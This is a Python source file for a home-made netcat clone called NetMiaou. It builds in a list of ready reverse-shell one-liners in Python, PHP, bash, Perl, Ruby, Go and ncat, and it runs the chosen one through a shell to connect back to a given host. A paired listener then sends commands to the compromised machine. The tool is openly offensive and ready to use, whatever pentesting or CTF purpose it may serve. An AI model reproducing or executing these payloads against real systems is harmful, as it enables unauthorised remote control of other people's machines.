#!/usr/bin/python3

import socket
import threading
import os
import argparse
import sys
import subprocess
import signal
import time
import http.server
import socketserver

parser = argparse.ArgumentParser(description="NetMiaou, a netcat made home ^_^", usage=f"usage : python3 {sys.argv[0]} [-h] [-l | -s | -q] [--show-payloads] [-H HOST] -P PORT [-f FILE | -m MESSAGE | -p] [-r] [-o OUTPUT]", epilog="you can see examples on https://github.com/TRIKKSS/NetMiaou")

mode = parser.add_argument_group(title="mode")
mode = mode.add_mutually_exclusive_group(required=False)
mode.add_argument("-l", "--listen", help="listen on localhost:[port] for incomming connection.", action="store_true")
mode.add_argument("-s", "--send", help="send data to [host]:[port]", action="store_true")
mode.add_argument("-q", "--http", help="create an http server on localhost:4000", action="store_true")

utils = parser.add_argument_group(title="utils")
utils.add_argument("-H", "--host", help="hostname or ip address", dest="host")
utils.add_argument("-P", "--port", dest="port", type=int)

send = parser.add_argument_group(title="send")
send = send.add_mutually_exclusive_group(required=False)
send.add_argument("-f", "--file", help="send file content", type=str)
send.add_argument("-m", "--message", help="send a simple text/message to [host]:[port].", type=str, dest="message")
send.add_argument("-p", "--payload", help="choose a payload for a reverse shell. Use with this form : -p langage:id --example-> -p python:1", type=str)

utils.add_argument("-r", "--reverseshell", help="initialize a listener for a reverseshell", action="store_true" )
utils.add_argument("--show-payloads", default=None, help="display the available payloads for reverse shell and exit", action="store_true", dest="show_payloads")
utils.add_argument("-o", "--output", help="upon receiving connection write the output into [OUTPUT]", type=str)


payloads = {"python" : ["export RHOST=\"%%HOST%%\";export RPORT=%%PORT%%;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
                        "python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%HOST%%\",%%PORT%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'", 
                        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%HOST%%\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"],
            "php"    : ["php -r '$sock=fsockopen(\"%%HOST%%\",%%PORT%%);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                        "php -r '$sock=fsockopen(\"%%HOST%%\",%%PORT%%);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                        "php -r '$sock=fsockopen(\"%%HOST%%\",%%PORT%%);`/bin/sh -i <&3 >&3 2>&3`;'",
                        "php -r '$sock=fsockopen(\"%%HOST%%\",%%PORT%%);system(\"/bin/sh -i <&3 >&3 2>&3\");'",
                        "php -r '$sock=fsockopen(\"%%HOST%%\",%%PORT%%);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'",
                        "php -r '$sock=fsockopen(\"%%HOST%%\",%%PORT%%);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'",
                        "php -r '$sock=fsockopen(\"%%HOST\",%%PORT%%);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"],
            "bash"   : ["bash -i >& /dev/tcp/%%HOST%%/%%PORT%% 0>&1", 
                        "/bin/bash -l > /dev/tcp/%%HOST%%/%%PORT%% 0<&1 2>&1",
                        "0<&196;exec 196<>/dev/tcp/%%HOST%%/%%PORT%%; sh <&196 >&196 2>&196"],
            "perl"   : ["perl -e 'use Socket;$i=\"%%HOST%%\";$p=%%PORT%%;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                        "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"%%HOST%%:%%PORT%%\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"],
			"ruby"   : ["ruby -rsocket -e'f=TCPSocket.open(\"%%HOST%%\",%%PORT%%).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
			            "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"%%HOST%%\",\"%%PORT%%\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'",],
			"golang" : ["echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"%%HOST%%:%%PORT%%\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"],
			"ncat"   : ["ncat.exe -e cmd.exe %%HOST%% %%PORT%%"]
}


class colors:
    VIOLET = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    NORMAL = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class netcat:
	def __init__(self, args):
		self.args = args
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.exit = False
		self.buffer = ""


	def run(self):
		if self.args.listen:
			self.listen()
		elif self.args.http:
			self.serverHTTP()
		elif self.args.payload:
			self.exec_payload()
		else:
			if self.args.file:
				try:
					self.buffer = open(self.args.file, "rb").read()
				except:
					print(f"{colors.RED}[-] Can't find file {self.args.file}{colors.NORMAL}")
					sys.exit(1)
			else:
				self.buffer = self.args.message.encode()
			self.send()


	def listen(self):
		self.socket.bind(("0.0.0.0", self.args.port))
		self.socket.listen(1)
		print(f"[*] Listening on 0.0.0.0:{self.args.port}")

		while True:
			client, address = self.socket.accept()
			print(f"{colors.GREEN}[*] Accepted connection from {address[0]}:{address[1]}{colors.NORMAL}")
			client_handler = threading.Thread(target=self.handle_client, args=(client,))
			client_handler.start()


	def send(self):
		print(f"[*] connecting to {self.args.host}:{self.args.port}")
		try:
			self.socket.connect((self.args.host, self.args.port))
		except:
			print("[-] Can't connect ...")
			sys.exit(1)
		print(f"{colors.GREEN}[+] Connected !\n[*] Sending message ...{colors.NORMAL}")
		self.socket.send(self.buffer)
		print(f"{colors.GREEN}[+] Message sent.{colors.NORMAL}")
		self.socket.close()


	def handle_client(self, client_socket):
		with client_socket as sock:
			if self.args.output:
				self.upload(sock)
			elif self.args.reverseshell:
				self.revshell(sock)
			else:
				request = sock.recv(4096)
				print(f"[*] Received: {request.decode('utf-8')}")
				sock.send(b'ACK')


	def upload(self, sock):
		buffer = b""
		print(f"{colors.GREEN}[*] Received data{colors.NORMAL}")
		while 1:
			data_recv = sock.recv(4096)
			buffer += data_recv
			if len(data_recv) < 4096:
				break
		file = open(self.args.output, "wb")
		file.write(buffer)
		file.close()
		print(f"{colors.GREEN}[+] Data successfully wrote into {self.args.output} {colors.NORMAL}")
		os._exit(1)


	def revshell(self, sock):
		print("\n")
		print(sock.recv(4096).decode())
		while True:
			while 1:
				buffer = b""
				data_recv = sock.recv(4096)
				buffer += data_recv
				if len(data_recv) < 4096:
					break
			print(buffer.decode(), end="")
			command = input()
			if command == "exit":
				print("\n[*] good bye o/")
				os._exit(0)
			command += "\n"
			try:
				sock.send(command.encode())
			except:
				print("[-] Error ...\n[*] Connection closed, good bye o/")
				os._exit(1)
			time.sleep(0.4)


	def serverHTTP(self):
		handler = http.server.SimpleHTTPRequestHandler
		with socketserver.TCPServer(("0.0.0.0", self.args.port), handler) as httpd:
			print(f"[*] HTTP SERVER STARTED AT 0.0.0.0:{self.args.port}\n")
			httpd.serve_forever()


	def exec_payload(self):
		error = f"{colors.RED}[-] Wrong payload.\n[-] payload name must have this form -> langage:id !\n[-] To see all available payloads use the --show-options flag.{colors.NORMAL}"
		wich_payload = self.args.payload.split(":")		
		if len(wich_payload) != 2:
			print(error)
			sys.exit(1)
		try:
			payload = payloads[wich_payload[0]][int(wich_payload[1])].replace("%%HOST%%", self.args.host).replace("%%PORT%%", str(self.args.port))
		except:
			print(error)
			sys.exit(1)
		print("[*] launching reverseshell ...")
		print(f"[*] payload used is : {payload}")
		if subprocess.run(payload, stderr=subprocess.DEVNULL, shell=True).returncode != 0:
			print(f"{colors.RED}[-] Payload don't work ...{colors.NORMAL}")
		print(f"{colors.RED}[-] connection seems closed, good bye o/{colors.NORMAL}")
		sys.exit(1)



def check_args(args):
	usage = f"usage : python3 {sys.argv[0]} [-h] [-l | -s | -q] [--show-payloads] [-H HOST] -P PORT [-f FILE | -m MESSAGE | -p] [-r] [-o OUTPUT]"
	if args.show_payloads:
		show_payloads()

	if args.send and not args.host:
		print(usage)
		print(f"{colors.RED}{sys.argv[0]}: error: the following argument is required: -H/--host{colors.NORMAL}")
		sys.exit(1)

	if not args.send and not args.listen and not args.http:
		print(usage)
		print(f"{colors.RED}{sys.argv[0]}: error: one of the following arguments are required -l/--listen | -s/--send | -q --http{colors.NORMAL}")
		sys.exit(1)

	if not args.port:
		print(usage)
		print(f"{colors.RED}{sys.argv[0]}: error: the following argument is required: -P/--port{colors.NORMAL}")
		sys.exit(1)

def ctrl_c(sig, frame):
	print("\n[*] keyboard interrupt received")
	print("[*] exiting ...")
	os._exit(0)


def show_payloads():
	for langage, payload in payloads.items():
		print(f"{colors.BLUE}[*] {colors.UNDERLINE}{langage}{colors.NORMAL}")
		for i in range(len(payload)):
			print(f"{colors.CYAN}[id: {i}]{colors.NORMAL} {payload[i]}")
		print("\n")
	print(f"{colors.YELLOW}[*] More payloads on https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md{colors.NORMAL}")
	sys.exit(0)


def main():
	signal.signal(signal.SIGINT, ctrl_c)
	
	args = parser.parse_args()
	check_args(args)
	print("""     _  _     _   __  __ _               
    | \\| |___| |_|  \\/  (_)__ _ ___ _  _ 
    | .` / -_)  _| |\\/| | / _` / _ \\ || |
    |_|\\_\\___|\\__|_|  |_|_\\__,_\\___/\\_,_|
""")	
	print(f"\n\t{colors.BOLD}write with {colors.RED}\u2764\ufe0f{colors.NORMAL}{colors.BOLD} by TRIKKSS{colors.NORMAL}\n")
	if os.name == "nt":
		print(f"\n{colors.YELLOW}[!] Warning, there is some bugs with socket on windows, some people can't stop the program with ctrl+c{colors.NORMAL}\n")
	nc = netcat(args)
	nc.run()


if __name__ == "__main__":
	main()
